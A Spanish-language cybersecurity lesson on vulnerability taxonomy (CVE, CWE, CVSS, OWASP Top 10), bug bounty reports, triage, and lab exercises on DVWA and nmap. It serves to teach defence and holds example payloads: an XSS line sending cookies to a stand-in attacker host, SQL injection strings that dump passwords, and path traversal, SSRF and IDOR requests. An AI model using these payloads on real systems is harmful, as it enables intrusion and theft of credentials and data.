---
title: "06 — Vulnerabilidades: qué son, cómo se encuentran y se clasifican"
---

# 06 — Vulnerabilidades: qué son, cómo se encuentran y se clasifican

> 🎯 **Objetivo:** entender el lenguaje de las vulnerabilidades: CVE, CVSS, CWE, OWASP. Saber leer un reporte y triagearlo.

## 1. ¿Qué es una vulnerabilidad?

Una **vulnerabilidad** es una debilidad en un sistema que un atacante puede explotar.

**Tres ingredientes para que haya problema:**
1. Una debilidad (bug en código, mala configuración, defecto de diseño).
2. Un atacante que la conoce.
3. Un activo que la organización quiere proteger.

Si falta cualquiera de los tres, no hay riesgo real (o el riesgo es despreciable).

## 2. Cómo se descubre una vulnerabilidad

- 🔬 **Investigación interna** — un equipo de seguridad audita el código.
- 🐛 **Reporte externo** — un investigador ético o un bug bounty hunter.
- 📢 **Divulgación pública** — alguien publica y la comunidad reacciona (a veces con miedo, a veces con calma).
- 🤖 **Fuzzers** — herramientas que meten inputs aleatorios y ven qué crashea.
- 🕵️ **Mercado negro** — actores maliciosos las venden (no confundir con bug bounty).
- ⛏️ **Minería en código abierto** — bots automatizados escanean GitHub 24/7.

## 3. Taxonomía: CVE, CWE, CVSS

### CVE (la "matrícula" de la vulnerabilidad)

- **CVE-AAAA-NNNN** — ID único asignado por MITRE.
- Ej: `CVE-2017-0144` (EternalBlue, la que usó WannaCry).
- Cada CVE tiene una descripción corta y referencias.

### CWE (la "familia" del problema)

- Categoría de debilidad (la "raíz" del problema).
- Ejemplos:
  - **CWE-79** — Cross-site Scripting (XSS)
  - **CWE-89** — SQL Injection
  - **CWE-22** — Path Traversal
  - **CWE-798** — Hardcoded credentials
  - **CWE-200** — Information Exposure

### CVSS (la "gravedad")

- Sistema 0–10. Versión actual: **CVSS 3.1**.
- Combina métricas: vector de ataque, complejidad, privilegios requeridos, interacción de usuario, impacto (C/I/A).
- Categorías: `None (0.0) / Low (0.1-3.9) / Medium (4.0-6.9) / High (7.0-8.9) / Critical (9.0-10.0)`.
- Ej: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` → 9.8 (crítico, red, sin interacción).

## 4. OWASP Top 10 (web)

El **OWASP Top 10** lista las 10 categorías de riesgo web más comunes (edición 2021):

1. **A01 — Broken Access Control** — el clásico: un usuario hace cosas que no debería.
2. **A02 — Cryptographic Failures** — datos sensibles sin cifrar, mal hashing, HTTP en vez de HTTPS.
3. **A03 — Injection** — SQLi, NoSQLi, LDAPi, command injection.
4. **A04 — Insecure Design** — fallas de diseño, no de código.
5. **A05 — Security Misconfiguration** — defaults inseguros, paneles admin abiertos, errores verbosos.
6. **A06 — Vulnerable & Outdated Components** — dependencias sin parchear.
7. **A07 — Identification & Authentication Failures** — login roto, contraseñas débiles, falta de MFA.
8. **A08 — Software & Data Integrity Failures** — actualizaciones sin verificar, CI/CD inseguro.
9. **A09 — Security Logging & Monitoring Failures** — ataques que nadie ve.
10. **A10 — Server-Side Request Forgery (SSRF)** — el servidor hace peticiones internas a tu nombre.

> 📂 Profundiza en cada categoría con labs en [`02-pentesting-red-team/`](../02-pentesting-red-team/) y [`01-CIBERSEGURIDAD/seguridad-aplicaciones/`](../01-CIBERSEGURIDAD/seguridad-aplicaciones/).

## 5. Vulnerabilidades comunes que verás 1000 veces

### 5.1 SQL Injection (SQLi)

```sql
SELECT * FROM users WHERE username='admin' AND password='lo_que_meta';
```

Si input es `' OR '1'='1`, la consulta se vuelve:
```sql
SELECT * FROM users WHERE username='' OR '1'='1' AND password='' OR '1'='1';
```
→ loguea como admin sin conocer la contraseña.

**Mitigación:** consultas preparadas, ORM, menos privilegios al usuario de DB.

### 5.2 XSS (Cross-Site Scripting)

```html
<!-- Input -->
<script>fetch('https://attacker.com/?c='+document.cookie)</script>
```

Si la web lo refleja sin sanitizar, el navegador ejecuta el JS y roba cookies.

**Variantes:** stored, reflected, DOM-based.
**Mitigación:** escapar output, CSP headers, sanitización.

### 5.3 SSRF

```http
GET /api/fetch?url=http://localhost:8080/admin
```

Si la app hace fetch a lo que el usuario le pasa, puede leer servicios internos.

### 5.4 IDOR

```http
GET /api/users/123/profile   # yo soy el 123
GET /api/users/124/profile   # veamos el de otro sin permiso
```

**IDOR = Insecure Direct Object Reference.** Falla de control de acceso.

### 5.5 Path Traversal

```http
GET /download?file=../../../../etc/passwd
```

### 5.6 Hardcoded secrets

```python
# 😱
API_KEY = "sk-1234567890abcdef"
```

> Bots escanean GitHub 24/7 y avisan al atacante en minutos.

## 6. Bug Bounty — reporte profesional

Si reportas a un bug bounty, espera algo así:

```
# Title
Stored XSS in profile name field via SVG upload

## Severity
High (CVSS 7.4)

## Description
When uploading a profile image in SVG format, the server does
not sanitize <script> tags inside the SVG XML namespace...

## Steps to Reproduce
1. Create a profile image in SVG that includes <script>alert(1)</script>
2. Upload as profile picture
3. View another user's profile page that renders my picture
4. XSS fires in their session

## Impact
Attacker can hijack any user's session, exfiltrate cookies,
perform actions on behalf of the user.

## Suggested Fix
- Serve all user uploads from a separate domain with no cookies
- Or convert SVG to a safe raster format on upload
- Add Content-Security-Policy header

## Evidence
[Attach screenshots / video / HTTP request-response]
```

> 📂 Ejemplo de template en [`02-pentesting-red-team/portafolio/`](../02-pentesting-red-team/portafolio/).

## 7. Triage — qué arreglo primero

P0 — Caer producción, fuga de datos masiva
P1 — Crítico explotable ya en producción
P2 — Medio, explotable con interacción o condiciones
P3 — Bajo, informativo, hardening

```
Riesgo = (Probabilidad de explotación) × (Impacto)
Considera: ¿está expuesto a internet? ¿hay exploit público? ¿afecta datos sensibles?
```

## 8. Cómo NO reportar una vulnerabilidad

❌ No publiques un 0-day sin avisar al fabricante primero (divulgación coordinada).
❌ No la pruebes en producción sin permiso.
❌ No la uses para beneficio propio.
✅ Coordina, espera el parche, después publica con crédito.

## 📌 Dónde practicar

| Recurso | Dónde |
|---|---|
| OWASP labs | [OWASP WebGoat](https://owasp.org/www-project-webgoat/), [DVWA](http://www.dvwa.co.uk/) |
| HackTheBox / TryHackMe | [`04-LABORATORIOS/htb-thm/`](../04-LABORATORIOS/htb-thm/) |
| Labs propios | [`04-LABORATORIOS/labs-propios/`](../04-LABORATORIOS/labs-propios/) |
| Writeups | [`04-LABORATORIOS/ctf-writeups/`](../04-LABORATORIOS/ctf-writeups/) |
| Análisis de vulnerabilidades | [`01-CIBERSEGURIDAD/03-analisis-vulnerabilidades/`](../01-CIBERSEGURIDAD/03-analisis-vulnerabilidades/) |
| Bug bounty hunting | [`01-CIBERSEGURIDAD/bug-bounty-hunting/`](../01-CIBERSEGURIDAD/bug-bounty-hunting/) |

## ✏️ Ejercicios prácticos

### Ejercicio 1: Investiga un CVE (15 min)

1. Ve a [nvd.nist.gov](https://nvd.nist.gov/) y busca un CVE de la última semana
2. Rellena esta ficha:

```markdown
## Ficha CVE

- **CVE ID:** CVE-XXXX-XXXX
- **Descripción corta:** ___
- **CWE asociado:** CWE-___
- **CVSS Score:** ___/10
- **Vector CVSS:** AV:___/AC:___/PR:___/UI:___/S:___/C:___/I:___/A:___
- **Categoría OWASP:** A___ - ___
- **¿Está expuesto a internet?** Sí/No
- **¿Hay exploit público?** Sí/No
- **Remediación:** ___
```

### Ejercicio 2: Escaneo con Nmap (20 min)

```bash
# 1. Escanea scanme.nmap.org (legal)
nmap -sV scanme.nmap.org

# 2. Escaneo de vulnerabilidades
nmap --script=vuln scanme.nmap.org

# 3. Escaneo completo de tu red local (SOLO tu red)
nmap -sV -O 192.168.1.0/24

# 4. Analiza los resultados
# ¿Qué versiones de software encontraste?
# ¿Alguna tiene CVEs conocidos?
```

**Preguntas:**
- ¿Qué servicios están corriendo versiones viejas?
- Si encuentras Apache 2.4.49, ¿qué CVE tiene? (busca en NVD)

### Ejercicio 3: DVWA - vulnerable web app (30 min)

```bash
# 1. Corre DVWA en Docker
docker run -d -p 8080:80 vulnerables/web-dvwa

# 2. Abre http://localhost:8080
# Usuario: admin | Contraseña: password

# 3. Completa estos módulos (en orden de dificultad):
- [ ] Reflected XSS (nivel low)
- [ ] SQL Injection (nivel low)
- [ ] Command Injection (nivel low)
- [ ] File Upload (nivel low)
- [ ] Brute Force (nivel low)

# 4. Para cada uno, documenta:
- El payload que usaste
- Por qué funciona
- Cómo se mitiga
```

### Ejercicio 4: SQL Injection manual (15 min)

En DVWA, selecciona SQL Injection y prueba:

```sql
-- 1. Input normal
1

-- 2. Forzar error
1'

-- 3. Bypass de autenticación
' OR '1'='1

-- 4. Unión de tablas
' UNION SELECT 1,2,3--

-- 5. Extraer datos
' UNION SELECT user(), password, 3 FROM users--

-- 6. Extraer version de DB
' UNION SELECT version(),2,3--
```

**Pregunta:** ¿Qué información extraíste? ¿Es sensible?

### Ejercicio 5: CVSS Calculator (10 min)

1. Ve a [first.org/cvss/calculator/3.1](https://www.first.org/cvss/calculator/3.1)
2. Configura este escenario:
   - Vulnerabilidad en panel de admin
   - Accesible solo desde red interna
   - Requiere autenticación
   - No afecta disponibilidad
3. Anota el score y explica por qué sube o baja

### Ejercicio 6: Escáner de vulnerabilidades con OpenVAS (20 min)

```bash
# 1. Instala OpenVAS (Docker)
docker run -d -p 443:443 -p 9392:9392 --name openvas mikesplain/openvas

# 2. Abre https://localhost:9392
# Credenciales: admin/admin

# 3. Crea un target para tu red local
# 4. Lanza un scan completo
# 5. Revisa los resultados:
- ¿Cuántos vulnerabilities encontró?
- ¿Cuántas son críticas?
- ¿Cuántas son de configuración?
```

### Ejercicio 7: Build your own vulnerability report (10 min)

```markdown
# Reporte de Vulnerabilidades - [Nombre del sistema]

## Resumen
- **Fecha:** YYYY-MM-DD
- **Alcance:** [qué se escaneó]
- **Total hallazgos:** X (Críticos: X, Altos: X, Medios: X, Bajos: X)

## Hallazgos Críticos

### 1. [Nombre de la vulnerabilidad]
- **CVE:** CVE-XXXX-XXXX
- **CVSS:** 9.8 (Crítico)
- **Descripción:** [qué hace]
- **Evidencia:** [request/response o screenshot]
- **Remediación:** [cómo arreglar]

## Recomendaciones generales
1. [ ] Actualizar dependencias
2. [ ] Implementar MFA
3. [ ] Configurar WAF
```

> ⏭️ **Siguiente:** [`07-etica-y-leyes.md`](./07-etica-y-leyes.md) — los límites que todo profesional debe respetar.
